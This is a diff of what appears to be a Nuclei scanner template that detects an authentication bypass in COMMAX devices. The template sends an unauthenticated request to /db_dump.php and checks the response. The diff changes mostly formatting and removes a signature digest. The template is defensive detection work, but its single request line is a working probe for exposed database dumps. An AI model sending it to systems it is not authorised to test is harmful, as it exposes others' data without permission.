@@ -9,11 +9,9 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/50206
     - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5661.php
-  metadata:
-    max-request: 1
-  tags: commax,auth-bypass,edb
+  tags: commax,auth-bypass
 
-http:
+requests:
   - raw:
       - |
         GET /db_dump.php HTTP/1.1
@@ -24,6 +22,7 @@ http:
 
     matchers-condition: and
     matchers:
+
       - type: word
         part: body
         words:
@@ -37,4 +36,4 @@ http:
       - type: status
         status:
           - 200
-# digest: 4b0a004830460221008eb6042ef37959c42d87b391d55a05f81cd29fed000b1647a2d3300585ba6fd9022100fb5192c65db16fd87d18d8646bacfa802830827c78c4d2e38df587536cab830a:922c64590222798bb761d5b6d8e72950
+# Enhanced by mp on 2022/05/27
